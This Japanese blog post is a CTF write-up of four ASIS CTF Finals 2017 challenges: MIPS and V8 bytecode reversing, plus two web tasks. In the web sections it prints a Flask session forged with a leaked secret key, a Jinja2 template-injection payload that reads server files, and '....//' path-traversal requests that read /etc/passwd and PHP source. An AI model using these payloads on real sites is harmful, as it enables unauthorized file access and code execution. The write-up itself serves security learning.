---
layout: post
title: ASIS CTF Finals 2017 の write-up
categories: [ctf]
date: 2017-09-11 09:00:00 +0900
---

チーム Harekaze で [ASIS CTF Finals 2017](https://asisctf.com/home/) に参加しました。最終的にチームで 1113 点を獲得し、順位は得点 590 チーム中 27 位でした。うち、私は 4 問を解いて 352 点を入れました。

以下、解いた問題の write-up です。

## [Reverse 116] Unlock Me

`unlock_me` というファイルが与えられました。`file` でどのようなファイルか調べてみましょう。

```
unlock_me: ELF 32-bit LSB executable, MIPS, MIPS-II version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=092f88544fb524412e330c626c0c711a16be16c2, not stripped
```

32bit の MIPS の ELF のようです。[Index of /~aurel32/qemu/mipsel](https://people.debian.org/~aurel32/qemu/mipsel/) からファイルをダウンロードして `qemu-system-mips64el -M malta -kernel vmlinux-3.2.0-4-5kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0"` を実行し、`unlock_me` を送ると実行ができました。

```
root@debian-mipsel:~# ./unlock_me
Enter the unlock code, 10 numbers in the range 1-5
1
1
1
1
1
1
1
1
1
1
Not quite
```

`objdump` で逆アセンブルすると、`main` では大体以下のような処理を行っていることが分かりました。

```c
typedef int (*FUNC)(int (*) [3]);
int main(void) {
  int var_1c;
  int var_20;
  int var_24[3] = { 0x12345, 0xa9867, 0xfedcb };
  FUNC var_40[5] = {
    op1, op2, op3, op4, op5
  };

  puts("Enter the unlock code, 10 numbers in the range 1-5");
  for (var_20 = 0; var_20 < 10; var_20++) {
    scanf("%u", &var_1c);
    if (0 > var_1c || var_1c > 6) {
      break;
    }
    var_40[x - 1](&var_24);
  }

  if (var_24[0] == 0xd7dfefff && var_24[1] == 0x50a001e9 && var_24[2] == 0xd68cbe7f) {
    puts("Congrats!! Flag: ASIS{the_unlock_code_here}");
  } else {
    puts("Not quite");
  }

  return 0;
}
```

`op1` … `op5` ではビット演算やらなんやらで引数として与えられた配列の要素をかき回しています。この配列が最終的に `{ 0xd7dfefff, 0x50a001e9, 0xd68cbe7f }` になればいいようなので、ブルートフォースで探してみましょう。

```c
/* gcc -z execstack -o test test.c */
#include <stdio.h>
#include <stdlib.h>

#define REP(i) for (i = 1; i < 6; i++)

typedef int (*FUNC)(int (*)[3]);

char op1[] = "\xf8\xff\xbd\x27\x04\x00\xbe\xaf\x25\xf0\xa0\x03\x08\x00\xc4\xaf\x08\x00\xc2\x8f\x00\x00\x42\x8c\x27\x18\x02\x00\x08\x00\xc2\x8f\x00\x00\x43\xac\x08\x00\xc2\x8f\x08\x00\x43\x8c\xd6\x8f\x02\x3c\xd4\xf5\x42\x34\x25\x18\x62\x00\x08\x00\xc2\x8f\x08\x00\x43\xac\x08\x00\xc2\x8f\x00\x00\x42\x8c\x82\x1a\x02\x00\x80\x15\x02\x00\x25\x10\x43\x00\x08\x00\xc3\x8f\x00\x00\x62\xac\x08\x00\xc2\x8f\x04\x00\x42\x8c\x02\x19\x02\x00\x00\x17\x02\x00\x25\x10\x43\x00\x08\x00\xc3\x8f\x04\x00\x62\xac\x08\x00\xc2\x8f\x04\x00\x43\x8c\xbe\x30\x02\x3c\xf2\x77\x42\x34\x26\x18\x62\x00\x08\x00\xc2\x8f\x04\x00\x43\xac\x08\x00\xc2\x8f\x08\x00\x42\x8c\x27\x18\x02\x00\x08\x00\xc2\x8f\x08\x00\x43\xac\x08\x00\xc2\x8f\x08\x00\x43\x8c\xa4\xf5\x02\x3c\x61\xc0\x42\x34\x24\x18\x62\x00\x08\x00\xc2\x8f\x08\x00\x43\xac\x08\x00\xc2\x8f\x08\x00\x43\x8c\x9a\x25\x02\x3c\x4c\x90\x42\x34\x24\x18\x62\x00\x08\x00\xc2\x8f\x08\x00\x43\xac\x08\x00\xc2\x8f\x08\x00\x43\x8c\x10\x9a\x02\x3c\xc4\x97\x42\x34\x26\x18\x62\x00\x08\x00\xc2\x8f\x08\x00\x43\xac\x08\x00\xc2\x8f\x00\x00\x42\x8c\x00\x1a\x02\x00\x02\x16\x02\x00\x25\x10\x43\x00\x08\x00\xc3\x8f\x00\x00\x62\xac\x00\x00\x00\x00\x25\xe8\xc0\x03\x04\x00\xbe\x8f\x08\x00\xbd\x27\x08\x00\xe0\x03\x00\x00\x00\x00";
char op2[] = "\xf8\xff\xbd\x27\x04\x00\xbe\xaf\x25\xf0\xa0\x03\x08\x00\xc4\xaf\x08\x00\xc2\x8f\x08\x00\x43\x8c\x8b\xb5\x02\x3c\xf8\x95\x42\x34\x21\x18\x62\x00\x08\x00\xc2\x8f\x08\x00\x43\xac\x08\x00\xc2\x8f\x04\x00\x43\x8c\x61\x4a\x02\x3c\xce\xf1\x42\x34\x25\x18\x62\x00\x08\x00\xc2\x8f\x04\x00\x43\xac\x08\x00\xc2\x8f\x08\x00\x42\x8c\x27\x18\x02\x00\x08\x00\xc2\x8f\x08\x00\x43\xac\x08\x00\xc2\x8f\x00\x00\x42\x8c\x42\x19\x02\x00\xc0\x16\x02\x00\x25\x10\x43\x00\x08\x00\xc3\x8f\x00\x00\x62\xac\x08\x00\xc2\x8f\x04\x00\x43\x8c\x07\xdf\x02\x3c\xc3\x25\x42\x34\x25\x18\x62\x00\x08\x00\xc2\x8f\x04\x00\x43\xac\x08\x00\xc2\x8f\x04\x00\x43\x8c\xa1\x35\x02\x3c\xfd\x9c\x42\x34\x21\x18\x62\x00\x08\x00\xc2\x8f\x04\x00\x43\xac\x08\x00\xc2\x8f\x08\x00\x43\x8c\x3a\xec\x02\x3c\xe6\x12\x42\x34\x21\x18\x62\x00\x08\x00\xc2\x8f\x08\x00\x43\xac\x08\x00\xc2\x8f\x00\x00\x43\x8c\xd4\x49\x02\x3c\x03\x8c\x42\x34\x21\x18\x62\x00\x08\x00\xc2\x8f\x00\x00\x43\xac\x08\x00\xc2\x8f\x04\x00\x42\x8c\x02\x1a\x02\x00\x00\x16\x02\x00\x25\x10\x43\x00\x08\x00\xc3\x8f\x04\x00\x62\xac\x08\x00\xc2\x8f\x00\x00\x42\x8c\x27\x18\x02\x00\x08\x00\xc2\x8f\x00\x00\x43\xac\x00\x00\x00\x00\x25\xe8\xc0\x03\x04\x00\xbe\x8f\x08\x00\xbd\x27\x08\x00\xe0\x03\x00\x00\x00\x00";
char op3[] = "\xf8\xff\xbd\x27\x04\x00\xbe\xaf\x25\xf0\xa0\x03\x08\x00\xc4\xaf\x08\x00\xc2\x8f\x00\x00\x42\x8c\x27\x18\x02\x00\x08\x00\xc2\x8f\x00\x00\x43\xac\x08\x00\xc2\x8f\x04\x00\x43\x8c\x30\xf6\x02\x3c\x6c\x86\x42\x34\x21\x18\x62\x00\x08\x00\xc2\x8f\x04\x00\x43\xac\x08\x00\xc2\x8f\x00\x00\x43\x8c\xa5\x86\x02\x3c\x4a\x90\x42\x34\x21\x18\x62\x00\x08\x00\xc2\x8f\x00\x00\x43\xac\x08\x00\xc2\x8f\x00\x00\x43\x8c\x60\xdc\x02\x3c\x7d\xb9\x42\x34\x21\x18\x62\x00\x08\x00\xc2\x8f\x00\x00\x43\xac\x08\x00\xc2\x8f\x04\x00\x42\x8c\xc0\x1b\x02\x00\x42\x14\x02\x00\x25\x10\x43\x00\x08\x00\xc3\x8f\x04\x00\x62\xac\x08\x00\xc2\x8f\x08\x00\x43\x8c\x73\xa6\x02\x3c\x46\x8f\x42\x34\x26\x18\x62\x00\x08\x00\xc2\x8f\x08\x00\x43\xac\x08\x00\xc2\x8f\x08\x00\x42\x8c\xc0\x1b\x02\x00\x42\x14\x02\x00\x25\x10\x43\x00\x08\x00\xc3\x8f\x08\x00\x62\xac\x08\x00\xc2\x8f\x04\x00\x43\x8c\xf3\x28\x02\x3c\xd9\x69\x42\x34\x21\x18\x62\x00\x08\x00\xc2\x8f\x04\x00\x43\xac\x08\x00\xc2\x8f\x08\x00\x42\x8c\x27\x18\x02\x00\x08\x00\xc2\x8f\x08\x00\x43\xac\x08\x00\xc2\x8f\x08\x00\x42\x8c\x02\x1b\x02\x00\x00\x15\x02\x00\x25\x10\x43\x00\x08\x00\xc3\x8f\x08\x00\x62\xac\x00\x00\x00\x00\x25\xe8\xc0\x03\x04\x00\xbe\x8f\x08\x00\xbd\x27\x08\x00\xe0\x03\x00\x00\x00\x00";
char op4[] = "\xf8\xff\xbd\x27\x04\x00\xbe\xaf\x25\xf0\xa0\x03\x08\x00\xc4\xaf\x08\x00\xc2\x8f\x04\x00\x43\x8c\xa0\x66\x02\x3c\x72\xf3\x42\x34\x21\x18\x62\x00\x08\x00\xc2\x8f\x04\x00\x43\xac\x08\x00\xc2\x8f\x04\x00\x42\x8c\x82\x19\x02\x00\x80\x16\x02\x00\x25\x10\x43\x00\x08\x00\xc3\x8f\x04\x00\x62\xac\x08\x00\xc2\x8f\x04\x00\x42\x8c\x80\x1b\x02\x00\x82\x14\x02\x00\x25\x10\x43\x00\x08\x00\xc3\x8f\x04\x00\x62\xac\x08\x00\xc2\x8f\x00\x00\x43\x8c\xd6\x57\x02\x3c\x9d\x40\x42\x34\x25\x18\x62\x00\x08\x00\xc2\x8f\x00\x00\x43\xac\x08\x00\xc2\x8f\x04\x00\x42\x8c\x42\x19\x02\x00\xc0\x16\x02\x00\x25\x10\x43\x00\x08\x00\xc3\x8f\x04\x00\x62\xac\x08\x00\xc2\x8f\x04\x00\x42\x8c\x82\x1a\x02\x00\x80\x15\x02\x00\x25\x10\x43\x00\x08\x00\xc3\x8f\x04\x00\x62\xac\x08\x00\xc2\x8f\x04\x00\x43\x8c\x7e\x95\x02\x3c\xb7\x59\x42\x34\x24\x18\x62\x00\x08\x00\xc2\x8f\x04\x00\x43\xac\x08\x00\xc2\x8f\x08\x00\x43\x8c\x77\xa9\x02\x3c\x85\xcb\x42\x34\x24\x18\x62\x00\x08\x00\xc2\x8f\x08\x00\x43\xac\x08\x00\xc2\x8f\x08\x00\x42\x8c\x27\x18\x02\x00\x08\x00\xc2\x8f\x08\x00\x43\xac\x08\x00\xc2\x8f\x04\x00\x43\x8c\xda\xd0\x02\x3c\xc9\x41\x42\x34\x26\x18\x62\x00\x08\x00\xc2\x8f\x04\x00\x43\xac\x00\x00\x00\x00\x25\xe8\xc0\x03\x04\x00\xbe\x8f\x08\x00\xbd\x27\x08\x00\xe0\x03\x00\x00\x00\x00";
char op5[] = "\xf8\xff\xbd\x27\x04\x00\xbe\xaf\x25\xf0\xa0\x03\x08\x00\xc4\xaf\x08\x00\xc2\x8f\x04\x00\x42\x8c\x27\x18\x02\x00\x08\x00\xc2\x8f\x04\x00\x43\xac\x08\x00\xc2\x8f\x00\x00\x43\x8c\xde\x39\x02\x3c\xf2\x8a\x42\x34\x24\x18\x62\x00\x08\x00\xc2\x8f\x00\x00\x43\xac\x08\x00\xc2\x8f\x00\x00\x43\x8c\x15\xc3\x02\x3c\x44\x87\x42\x34\x25\x18\x62\x00\x08\x00\xc2\x8f\x00\x00\x43\xac\x08\x00\xc2\x8f\x08\x00\x42\x8c\xc0\x18\x02\x00\x42\x17\x02\x00\x25\x10\x43\x00\x08\x00\xc3\x8f\x08\x00\x62\xac\x08\x00\xc2\x8f\x04\x00\x42\x8c\x82\x1b\x02\x00\x80\x14\x02\x00\x25\x10\x43\x00\x08\x00\xc3\x8f\x04\x00\x62\xac\x08\x00\xc2\x8f\x04\x00\x42\x8c\x82\x19\x02\x00\x80\x16\x02\x00\x25\x10\x43\x00\x08\x00\xc3\x8f\x04\x00\x62\xac\x08\x00\xc2\x8f\x00\x00\x43\x8c\x03\x50\x02\x3c\x0a\x21\x42\x34\x25\x18\x62\x00\x08\x00\xc2\x8f\x00\x00\x43\xac\x08\x00\xc2\x8f\x08\x00\x42\x8c\x27\x18\x02\x00\x08\x00\xc2\x8f\x08\x00\x43\xac\x08\x00\xc2\x8f\x04\x00\x42\x8c\x27\x18\x02\x00\x08\x00\xc2\x8f\x04\x00\x43\xac\x08\x00\xc2\x8f\x04\x00\x43\x8c\xa8\x05\x02\x3c\x70\xed\x42\x34\x26\x18\x62\x00\x08\x00\xc2\x8f\x04\x00\x43\xac\x00\x00\x00\x00\x25\xe8\xc0\x03\x04\x00\xbe\x8f\x08\x00\xbd\x27\x08\x00\xe0\x03\x00\x00\x00\x00";

FUNC ops[] = {
  NULL, op1, op2, op3, op4, op5
};

int main(void) {
  int var_24[3];
  int a, b, c, d, e, f, g, h, i, j;

  REP(a) REP(b) REP(c) REP(d) REP(e) REP(f) REP(g) REP(h) REP(i) REP(j) {
    var_24[0] = 0x12345;
    var_24[1] = 0xa9867;
    var_24[2] = 0xfedcb;

    ops[a](&var_24);
    ops[b](&var_24);
    ops[c](&var_24);
    ops[d](&var_24);
    ops[e](&var_24);
    ops[f](&var_24);
    ops[g](&var_24);
    ops[h](&var_24);
    ops[i](&var_24);
    ops[j](&var_24);

    if (var_24[0] != 0xd7dfefff)
      continue;
    if (var_24[1] != 0x50a001e9)
      continue;
    if (var_24[2] != 0xd68cbe7f)
      continue;

    printf("%d %d %d %d %d %d %d %d %d %d\n", a, b, c, d, e, f, g, h, i, j);
  }
  
  return 0;
}
```

コンパイルして実行しましょう。

```
root@debian-mipsel:~# gcc -z execstack -o test test.c
...
root@debian-mipsel:~# ./solver
2 1 3 1 4 4 1 1 5 4
root@debian-mipsel:~# ./unlock_me
Enter the unlock code, 10 numbers in the range 1-5
2
1
3
1
4
4
1
1
5
4
Congrats!! Flag: ASIS{the_unlock_code_here}
```

```
ASIS{2131441154}
```

## [Reverse 138] Cute V8

`cute_v8` という [V8](https://github.com/v8/v8/wiki) のバイトコードを逆アセンブルしたテキストファイルが与えられました。

[Understanding V8’s Bytecode – DailyJS – Medium](https://medium.com/dailyjs/understanding-v8s-bytecode-317d46c94775) と [src/interpreter/interpreter-generator.cc - v8/v8.git - Git at Google](https://chromium.googlesource.com/v8/v8.git/+/master/src/interpreter/interpreter-generator.cc) を読みながらデコンパイルしてみましょう。

`cute_v8` 中に何度か出現する、以下のような命令列について考えます。

```
LdaGlobal [1], [...]
Star r10
LdaNamedProperty r10, [2], [...]
Star r9
CallProperty1 r9, r10, r0, [...]
```

`LdaGlobal` でオブジェクトをロードし、`LdaNamedProperty` でこのオブジェクトのプロパティをロード、`CallProperty1` で `r0` を引数に呼び出しているようです。

Constant pool が与えられていないので何のオブジェクトか、どのプロパティかを直接知ることはできません。ですが、いずれも第一引数が数値で、呼び出し後に返り値が文字列と思われるレジスタ (`r6`) に結合されていることから、`String.fromCharCode` か `String.fromCodePoint` であると推測できます。

return の直前にも似たような命令列が出現しています。

```
LdaGlobal [3], [91]
Star r10
LdaNamedProperty r10, [4], [93]
Star r9
CallProperty1 r9, r10, r6, [89]
LdaUndefined
Return
```

`r6` は文字列と思われます。呼び出し後に return していますが、どうやら `r6` を返り値にするわけではないようです。おそらくこれは `console.log` でしょう。

デコンパイルしていくと、最終的に以下のようなコードが得られました。

```javascript
function get_flag() {
  let r0 = 65;
  let r1 = 83;
  let r2 = 73;
  let r3 = 123;
  let r4 = 125;
  let r5 = 95;
  let r6 = "";
  let r7 = 0;

  r6 = String.fromCharCode(r0) + String.fromCharCode(r1) + String.fromCharCode(r2) + String.fromCharCode(r1) + String.fromCharCode(r3);
  for (let r8 = 0; r8 <= 20; r8++) {
    let r9 = 47 < r0;
    if (!(r9 < 58)) {
      r9 = 64 < r0;
      if (!(r9 < 90)) {
        r9 = 96 < r0;
        if (r9 < 123) {
          r6 += String.fromCharCode(r0);
        }
      }
    }
    r6 += String.fromCharCode(r0);
    if (r7 == 2) {
      r0 ^= 4;
    }
    if (r7 >= 1) {
      r0 ^= 3;
    }
    r0 += 5;
    if (122 < r0) {
      r7 += 1;
      r6 += String.fromCharCode(r5);
      r0 = 66;
    }
    if (r0 < 48) {
      r0 += 30;
    }
  }
  r6 += String.fromCharCode(r4);
  console.log(r6);
}
```

`get_flag()` を実行するとフラグが得られました。

```
> get_flag()
ASIS{AFKPUZ_dinsx_BFJNRVZ^b}
```

```
ASIS{AFKPUZ_dinsx_BFJNRVZ^b}
```

## [Web 41] Golem is stupid!

与えられた URL にアクセスすると、テキストを入力できるフォームが表示されました。

適当に入力してみると `Hello : hoge, why you don't look at our article?` と表示されました。

Cookie を確認してみると `session` に `eyJnb2xlbSI6ImhvZ2UifQ.DJcnPw.J7GmyOI2g2-i_Q_xu0vipoUVAvw` のような値がセットされていました。`(セッションの値).(有効期限).(署名)` という形式のセッションのようです。セッションの値を Base64 デコードすると `{"golem":"hoge"}` が出てきました。

先ほどのメッセージの `article` は `/article?name=article` へのリンクになっていました。`/article` は `/article?name=../../../etc/passwd` のようにすると好きなファイルを読むことができ、[@tukejonny](https://twitter.com/tukejonny) さんが `/proc/self/cmdline` から `/etc/uwsgi/apps-enabled/golem_proj.ini` という uWSGI の設定ファイル、`/etc/uwsgi/apps-enabled/golem_proj.ini` から `/opt/serverPython/golem/server.py` にサーバのコードを見つけていました。

`/opt/serverPython/golem/server.py` は以下のような内容でした。

```python
#!/usr/bin/python
import os

from flask import (
	Flask, 
	render_template,
	request,
	url_for,
	redirect,
	session,
	render_template_string
)
from flask.ext.session import Session

app = Flask(__name__)


execfile('flag.py')
execfile('key.py')

FLAG = flag
app.secret_key = key

@app.route("/golem", methods=["GET", "POST"])
def golem():
	if request.method != "POST":
		return redirect(url_for("index"))

	golem = request.form.get("golem") or None

	if golem is not None:
		golem = golem.replace(".", "").replace("_", "").replace("{","").replace("}","")
	
	if "golem" not in session or session['golem'] is None:
		session['golem'] = golem

	template = None

	if session['golem'] is not None:
		template = '''
    ...
		<h1>Golem Name</h1>
		<div class="row>
		<div class="col-md-6 col-md-offset-3 center">
		Hello : %s, why you don't look at our <a href='/article?name=article'>article</a>?
		</div>
		</div>
    ...
		''' % session['golem']

		print 

		session['golem'] = None

	return render_template_string(template)

@app.route("/", methods=["GET"])
def index():
	return render_template("main.html")

@app.route('/article', methods=['GET'])
def article():

    error = 0

    if 'name' in request.args:
        page = request.args.get('name')
    else:
        page = 'article'

    if page.find('flag')>=0:
    	page = 'notallowed.txt'

    try:
        template = open('/home/golem/articles/{}'.format(page)).read()
    except Exception as e:
        template = e

    return render_template('article.html', template=template)

if __name__ == "__main__":
	app.run(host='0.0.0.0', debug=False)
```

`execfile('key.py')` とあります。`/opt/serverPython/golem/key.py` は以下のような内容でした。

```
key = '7h15_5h0uld_b3_r34lly_53cur3d'
```

この `key` はそのまま `app.secret_key = key` という感じでセッションの署名に使われています。[以前書いたスクリプト](2017-07-17-ctfzone-2017.html#web-687-leaked-messages) をいじってセッションを作ってみましょう。

`app.py`

```python
import requests
from flask import *

from flag import FLAG

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
  if request.method == 'POST':
    session['golem'] = request.form['golem']
    return render_template('index.html', username=request.form['golem'])
  return render_template('index.html', golem='')

app.secret_key = '7h15_5h0uld_b3_r34lly_53cur3d'
app.config['SESSION_COOKIE_HTTPONLY'] = False
app.run(port=4000, debug=True)
```

`template/index.html`

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Golem is stupid!</title>
  </head>
  <body>
    <form method="POST">
      <label>username: <input type="text" name="golem" value="" size=100></label><br>
      <input type="submit" value="submit"></form>
    </form>
    <hr>
    <pre id="out"></pre>
    <script>
    window.addEventListener('load', () => {
      let out = document.getElementById('out');
      out.textContent = document.cookie;
    }, false);
    </script>
  </body>
</html>
```

`fuga` を入力して出てきた文字列を Cookie にセットすると `Hello : fuga` と表示されました。

これで何ができるか調べましょう。`/opt/serverPython/golem/server.py` を見ていると気になる箇所がありました。

```python
	golem = request.form.get("golem") or None

	if golem is not None:
		golem = golem.replace(".", "").replace("_", "").replace("{","").replace("}","")
	
	if "golem" not in session or session['golem'] is None:
		session['golem'] = golem
...
	if session['golem'] is not None:
		template = '''
    ...
		<h1>Golem Name</h1>
		<div class="row>
		<div class="col-md-6 col-md-offset-3 center">
		Hello : %s, why you don't look at our <a href='/article?name=article'>article</a>?
		</div>
		</div>
		...
		''' % session['golem']
```

テンプレートにそのまま `session['golem']` を突っ込んでいます。この前に `.` `_` `{` `}` を削除していますが、これはフォームから入力があった場合にのみ行われるため、セッションを直接改変した際には Server-Side Template Injection が可能となっています。

試しに先ほどのスクリプトで `{% raw %}{{ 1 + 2 }}{% endraw %}` を入力して出てきた文字列を Cookie にセットすると `Hello : 3` と表示されました。

SSTI を利用して `/opt/serverPython/golem/flag.py` が読めないか調べてみましょう。

[Exploring SSTI in Flask/Jinja2, Part II - nVisium Blog](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/) を参考に `{% raw %}{{ ''.__class__.__mro__[2].__subclasses__()[40]('flag.py').read() }}{% endraw %}` をセッションに入れるとフラグが得られました。

```
ASIS{I_l0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!}
```

## [Web 57] Mathilda

与えられた URL にアクセスすると、ソースに以下のようなコメントがありました。

```
<center><br><br>
    <h2>Welcome to home</h2>
    <p>This website has been developed and deployed by me. It's static web page and I'm working on new design.</p>
<img src=tilda.png height="400">

<!-- created by ~rooney -->
```

`/~rooney/` にアクセスするとソースは以下のようになっていました。

```html
<pre>
<center>
<h1>Welcome to rooney page</h1>
<img src=files/mathilda.jpg height="450"></img>

<a href='?path=rooney'>file</a>
```

`?path=rooney` にアクセスすると Wayne Mark Rooney さんのプロフィールが表示されました。画像の `src` から `files/` にアクセスするとファイルの一覧が表示されました。

```
[IMG]	mathilda.jpg	2017-09-08 08:44	55K	 
[   ]	rooney	2017-09-08 08:19	633	 
[IMG]	rooney.png	2016-10-24 04:46	316K	 
```

`files/rooney` にアクセスすると `?path=rooney` にアクセスした際と同じ文章が表示されました。どうやら `'files/' . $_GET['path']` を読んで出力しているようです。

`index.php` が読めないか `../index.php` にアクセスしてみましたが、何も表示されませんでした。`?path=roo../ney` にアクセスすると `?path=rooney` にアクセスした際と同じ表示になるため、どうやら `../` を削除しているようです。

`?path=....//index.php` にアクセスすると `index.php` の内容が取得できました。

```php
<?php

if(strstr($_GET['path'], 'flag')!==false)
    die('Security failed!');

echo file_get_contents('files/' . str_replace('../', '', $_GET['path']));

?>
```

`?path=....//....//....//....//etc/passwd` にアクセスすると `/etc/passwd` の内容が取得できました。

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:109::/var/run/dbus:/bin/false
lxd:x:107:65534::/var/lib/lxd/:/bin/false
uuidd:x:108:113::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
rooney:x:1000:1000:,,,:/home/rooney:/bin/false
th1sizveryl0ngus3rn4me:x:1001:1001:,,,:/home/th1sizveryl0ngus3rn4me:/bin/bash
```

`th1sizveryl0ngus3rn4me` というユーザがいるようです。`/~th1sizveryl0ngus3rn4me/` にアクセスすると `Invalid Device` と表示されました。

`?path=....//....//....//....//home/th1sizveryl0ngus3rn4me/public_html/index.php` にアクセスするとフラグが得られました。

```
<?php


if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'mobile')!==false){
        if(strpos($_SERVER['HTTP_REFERER'], 'th1sizveryl0ngus3rn4me')!==false){
                    echo 'ASIS{I_l0V3_Us3rD1r_Mpdul3!!}';
                        }else
                                    echo 'Hot-linking is disabled';
}else
        echo 'Invalid Device';


?>
```

```
ASIS{I_l0V3_Us3rD1r_Mpdul3!!}
```

---

これは想定していた解法ではなかったのか、途中から `path` に `index.php` が入っていると `Security failed!` と出力されるようになっていました。他の解法を考えてみましょう。

まず `Invalid Device` という出力から携帯端末のブラウザで閲覧すればいいのかと考えます。Chrome for Android の UA を使ってアクセスしてみましょう。

```
$ curl http://178.62.48.181/~th1sizveryl0ngus3rn4me/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"
Hot-linking is disabled
```

直リン禁止のようです。リファラを使って外部からのアクセスではないように見せかけましょう。

```
$ curl http://178.62.48.181/~th1sizveryl0ngus3rn4me/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19" -e "http://178.62.48.181/~th1sizveryl0ngus3rn4me/"
ASIS{I_l0V3_Us3rD1r_Mpdul3!!}
```

フラグが得られました。